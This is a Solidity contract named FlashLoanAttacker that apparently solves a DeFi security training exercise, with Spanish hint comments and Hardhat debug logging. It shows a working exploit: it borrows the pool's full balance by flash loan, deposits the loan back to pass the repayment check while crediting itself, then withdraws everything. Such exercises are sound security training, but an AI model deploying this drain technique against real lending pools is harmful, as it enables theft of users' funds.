// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract FlashLoanAttacker is Ownable {
    IFlashLoanPool private immutable pool;

    constructor(address poolAddress) {
        pool = IFlashLoanPool(poolAddress);
    }

    function attack() external onlyOwner {
        console.log("entre a attack");
        // ¿Cómo iniciamos el ataque?
        // ¿Tal vez por el flash loan? ¿Y luego?
        console.log("address(pool).balance1: ", address(pool).balance);
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        console.log("address(pool).balance1: ", address(pool).balance);
        console.log("addres(this).balance1: ", address(this).balance);
    }

    function execute() external payable {
        console.log("entre a execute");
        // Si pedimos un flash loan, ¿qué hacemos con los ETH que llegan a esta función?
        pool.deposit{value: msg.value}();
        console.log("addres(this).balance2: ", address(this).balance);
    }

    receive() external payable {}
}
